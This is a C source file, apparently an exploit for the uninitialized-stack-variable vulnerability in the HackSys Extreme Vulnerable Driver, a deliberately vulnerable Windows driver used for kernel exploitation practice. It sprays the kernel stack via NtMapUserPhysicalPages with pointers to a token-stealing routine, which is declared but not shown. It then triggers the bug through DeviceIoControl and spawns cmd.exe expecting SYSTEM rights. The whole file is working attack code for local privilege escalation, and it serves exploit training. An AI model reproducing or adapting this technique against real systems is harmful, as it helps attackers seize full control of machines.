#include <Windows.h>
#include <stdio.h>

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK 0x22202F

typedef NTSTATUS (WINAPI *PNtMapUserPhysicalPages)(
    __in PVOID VirutalAddress,
    __in ULONG_PTR NumberOfPages,
    __in_ecount_opt(NumberOfPages) PULONG_PTR UserPfnArray);

void StealToken();

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        printf("[-] Error open device with error code: %x.\n", GetLastError());
        return NULL;
    }

    return hRet;
}

BOOL SprayStack()
{

    BYTE buf[4];
    DWORD dReturn = 0;
    *(PULONG32)buf = 0xBAD0B0B0 + 1;

    HANDLE device = GetDeviceHandle();
    if (device == NULL) {
        exit(-1);
    }

    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
    if (ntdll == NULL) {
        printf("[-] Failed to get handle of ntdll.dll.\n");
        return FALSE;
    }

    PNtMapUserPhysicalPages NtMapUserPhysicalPages = (PNtMapUserPhysicalPages)GetProcAddress(
        ntdll,
        "NtMapUserPhysicalPages"
    );
    if (NtMapUserPhysicalPages == NULL) {
        printf("[-] Failed to get NtMapUserPhysicalPages address.\n");
        return FALSE;
    }
    printf("[+] NtMapUserPhysicalPages: %p.\n", NtMapUserPhysicalPages);

    PULONG64 v = (PULONG64)malloc(0x400 * 8);
    if (v == NULL) {
        printf("[-] Failed to malloc.\n");
        return FALSE;
    }

    for (int i = 0; i < 0x400; ++i) {
        v[i] = (ULONG64)StealToken;
        // v[i] = (ULONG)&StealToken;
    }

    NtMapUserPhysicalPages(NULL, 0x400, v);

    

    if (DeviceIoControl(device,
        HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK,
        buf,
        4,
        NULL,
        0,
        &dReturn,
        NULL
    )) {
        printf("[+] Successfully trigger the vulnerablity.\n");
    }
    else {
        printf("[-] Try again...");
    }

    return TRUE;
}

int main()
{
    SprayStack();

    printf("[+] Spawn a system shell.\n");
    system("cmd.exe");
    
    return 0;
}